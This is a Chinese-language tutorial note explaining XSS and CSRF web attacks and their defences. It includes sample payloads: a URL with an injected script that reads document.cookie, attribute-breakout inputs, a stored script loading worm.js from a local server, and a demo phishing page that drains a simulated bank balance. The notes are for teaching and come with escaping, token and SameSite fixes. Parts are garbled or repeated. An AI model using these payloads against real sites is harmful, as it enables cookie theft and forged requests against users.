# 网站常见的 2 种攻击

> · xss(跨站脚本攻击) (casading style sheets) \
> · csrf(跨站请求伪造攻击) (cross-site request forgery)

## xss 跨站脚本攻击

### 概念理解

> 是一种代码注入攻击,很像 sql 注入，在网站上注入非法脚本。
> 攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的 cookie 等。信息。
> XSS 本质是因为网站没有对恶意代码进行过滤，与正常的代码混合在一起了，浏览器没有办法分辨哪些脚本是可信的，从而导致了恶意代码的执行。

攻击者可以通过 xss 攻击：

- 获取页面数据，如 DOM，包括 DOM、cookie、localStorage，
- DOS 攻击，发送合理请求，占用服务器资源，从而使用户无法访问服务器
- 破坏页面结构
- 流量劫持（将链接指向某网站）

### XSS 攻击类型(分类)

#### · 反射型 xss

> 指攻击者构建了特殊的 URL，当服务器接收到请求后，从 URL 中获取数据，拼接到 HTML 后返回，从而导致了恶意代码的执行。

```
举例:实现一个登陆功能, 通过 cookie 校验身份，cookie 可能会被盗走
登陆场景常规实现
  客户端
    用户输入账号和密码点击登陆后，服务端返回code:0，则表示登陆成功跳转至/welcome欢迎页
  服务端
    接收登陆请求后，验证用户名和密码，无误-->
    let session={},SESSION_ID='connect.sid'
    1.随机生成的cardId表示用户身份
    2.给客户端设置cookie:res.cookie(SESSION_ID,cardId)
    3.存储用户登陆信息session[cardId]={user}
    4.返回code:0
    欢迎页
    app.get('/welcome',(req,res)=>{res.send(`${req.query.type}`)})
问题
  用户登陆成功后，诱导用户自己点开(一次性)
  http:localhost:3001/welcome?type=script>alert(document.cookie)/script>
  成功获取到cookie
  （chrome 发现路径存在异常（注入js脚本） 会有xss屏蔽功能）
解决方式
  1.设置httpOnly:true禁止浏览器访问这个cookie，让cookie在前端不可以获取
  · res.cookie(SESSION_ID, cardId, { httpOnly: true })
  缺点
    · 并不是解决xss的方案 只是降低受损的范围
    · 虽然阻止了黑客，但用户也访问不了了，而且依然没有根本上阻止脚本注入
  2.处理反射型xss:encodeURIComponent
    app.get('/welcome',(req,res)=>{res.send(`${encodeURIComponent(req.query.type)}`)})
```

#### · DOM_BASED 型 xss

> 攻击者构建了特殊的 URL，用户打开网站后，js 脚本从 URL 中获取数据，从而导致了恶意代码的执行。

```
    · 不基于后端
    · 当用户在页面插入了内容，或者修改了某个标签的属性，document.write()
    · 改变页面结构后，会造成攻击
    · 攻击的内容一般被叫做 xss payload xss载体
    · 只是改变了当前客户端的页面展示。不会伤害到其他用户的客户端
  例子:
    $('#add').on('click', function() {
      $('.box').html(`img src="${$('#web').val()}">`)
    })
    比如用户输入
    xxx" onerror="alert(1)" id="
    or
    ">script>alert(1)/script>
  解决方式:
    处理DOM-BASED型xss: encodeURI转译输入的内容
    $(".box").html(`img src="${encodeURI($("#web").val())}">`);
```

#### · 持久型/存储型 xss:

> 恶意脚本/代码提交/存储到了网站的服务器/数据库中，所有用户访问都会造成攻击
> 恶意的脚本存储到了服务器上，所有人访问时都会造成攻击,比反射型和 DOM-Based 范围更大
> 如微博,访问时会以自己的身份发一条恶意微博

```
  例子:
    评论页面中，用户输入评论提交后，提交内容展示在评论列表
  解决方式
    3处过滤->客户端发数据/服务端接受数据/输出时
    1.客户端发数据
      let content = encodeHtml($("#content").val());
    2.输出时过滤
      function encodeHtml(str) {
        return str
          .replace(/&/g, "&amp;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&apos;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;");
            }
. ps:第三方网站怎么拿到 cookie 的？
    · 第三方网站其实拿不到用户cookie, 当用户往3000端口提交内容时自动会动提交 cookie
    · 表单提交没有跨域问题，同源问题只在 ajax 上
```

#### 如何防御 XSS

可以从浏览器的执行来进行预防，一种是使用纯前端的方式，不用服务器端拼接后返回。另一种是对需要插入到 HTML 中的代码做好充分的转义。对于 DOM 型的攻击，主要是前端脚本的不可靠而造成的，我们对于数据获取渲染和字符串拼接的时候应该对可能出现的恶意代码情况进行判断。
使用 CSP ，CSP 的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行，从而防止恶意代码的注入攻击。

- CSP 指的是内容安全策略，它的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规 则，如何拦截由浏览器自己来实现。
- 通常有两种方式来开启 CSP，一种是设置 HTTP 首部中的 Content-Security-Policy，一种是设置 meta 标签的方式
对一些敏感信息进行保护，比如 cookie 使用** http-only** ，使得脚本无法获取。也可以使用验证码，避免脚本伪装成用户执行一些操作。
  <pre>

· csrf (cross-site request forgery)
理解
跨站请求伪造，冒充用户的身份做一些事情。拿不到 cookie，而是让用户发起一些钓鱼请求
举例
比如一个交友网站，访问之后可以记录你的身份冒充你。
如钓鱼网站，给个吸引他的网站
如转账: a 给 b 转账，转账之前访问了恶意页面导致安全问题
实现一个钓鱼网站，盗走用户银行卡账户余额
1.node server.csrf.js / npm run csrf 开启钓鱼网站 3001 服务
2.node server.js / npm run start 开启目标 3000 服务 3.模拟用户访问 localhost:3000,登陆成功 4.模拟用户访问 localhost:3001/fish.html 钓鱼连接，发现账户余额减少
（跨域名，钓鱼失败: 模拟用户访问 http://a.crx.cn:3001/fish.html 钓鱼连接，账户余额不会减少）

防止 csrf 攻击 1.添加验证码 (体验不好)
2.referer: 判断来源，如果是从 3001 发到 3000 的，断定是伪造的
if (referer.includes("http://localhost:3000")) {}
(不靠谱 可以通过 node 自己发请求来实现伪造)
延伸：host 请求的主机
3.token
crypto 模块加密，给一个加密后的 token, 类似验证码，但用户无感知
12306 防御的不是盗取用户信息，而是机器人并发量

后台 express，前台 jquery
解决方式:
转账前输入验证码，设置 vpn 禁止访问某些网站

实现一个登陆功能
通过 cookie 校验身份，cookie 可能会被盗走

存储型 xss:
恶意的脚本存储到了服务器上，所有人访问时都会造成攻击,比反射型和 DOM-Based 范围更大
持久型/存储型: 恶意写入的信息入了数据库/服务端，所有用户请求访问都会造成攻击
微博 访问时会以自己的身份发一条恶意微博

- 抓包拿到 cookie 和 token---https
- xss + csrf = xsrf 弱网站
  在评论输入框中注入一段脚本 script src="localhost:3001/worm.js">
  $.post('/api/addComment',{content:'i am cherish'})
  伪造信息
  </pre>

## 2.1 CSRF 概念

CSRF 攻击指的是跨站请求伪造攻击，攻击者诱导用户进入一个第三方网站，然后该网站向被攻击网站发送跨站请求。如果用户在被攻击网站中保存了登录状态，那么攻击者就可以利用这个登录状态，绕过后台的用户验证，冒充用户向服务器执行一些操作。

CSRF 攻击的本质是利用了 cookie 会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充。

## 2.2 CSRF 攻击类型

GET 类型的 CSRF 攻击，比如在网站中的一个 img 标签里构建一个请求，当用户打开这个网站的时候就会自动发起提交。
POST 类型的 CSRF 攻击，比如说构建一个表单，然后隐藏它，当用户进入页面时，自动提交这个表单。
链接类型的 CSRF 攻击，比如说在 a 标签的 href 属性里构建一个请求，然后诱导用户去点击。

## 2.3 如何防御 CSRF

第一种是同源检测的方法，服务器根据 http 请求头中 origin 或者 referer 信息来判断请求是否为允许访问的站点，从而对请求进行过滤。**当 origin 或者 referer 信息都不存在的时候，直接阻止。**这种方式的缺点是有些情况下 referer 可以被伪造。还有就是我们这种方法同时把搜索引擎的链接也给屏蔽了，所以一般网站会允许搜索引擎的页面请求，但是相应的页面请求这种请求方式也可能被攻击者给利用。
第二种方法是使用 **CSRF Token **来进行验证，服务器向用户返回一个随机数 Token ，当网站再次发起请求时，在请求参数中加入服务器端返回的 token ，然后服务器对这个 token 进行验证。这种方法解决了使用 cookie 单一验证方式时，可能会被冒用的问题，但是这种方法存在一个缺点就是，我们需要给网站中的所有请求都添加上这个 token，操作比较繁琐。还有一个问题是一般不会只有一台网站服务器，如果我们的请求经过负载平衡转移到了其他的服务器，但是这个服务器的 session 中没有保留这个 token 的话，就没有办法验证了。这种情况我们可以通过改变 token 的构建方式来解决。
第三种方式使用双重 Cookie 验证的办法，服务器在用户访问网站页面时，向请求域名注入一个 Cookie，内容为随机字符串，然后当用户再次向服务器发送请求的时候，从 cookie 中取出这个字符串，添加到 URL 参数中，然后服务器通过对 cookie 中的数据和参数中的数据进行比较，来进行验证。使用这种方式是利用了攻击者只能利用 cookie，但是不能访问获取 cookie 的特点。并且这种方法比 CSRF Token 的方法更加方便，并且不涉及到分布式访问的问题。这种方法的缺点是如果网站存在 XSS 漏洞的，那么这种方式会失效。同时这种方式不能做到子域名的隔离。
第四种方式是使用在设置** cookie 属性的时候设置 Samesite** ，限制 cookie 不能作为被第三方使用，从而可以避免被攻击者利用。Samesite 一共有两种模式，一种是严格模式，在严格模式下 cookie 在任何情况下都不可能作为第三方 Cookie 使用，在宽松模式下，cookie 可以被请求是 GET 请求，且会发生页面跳转的请求所使用。
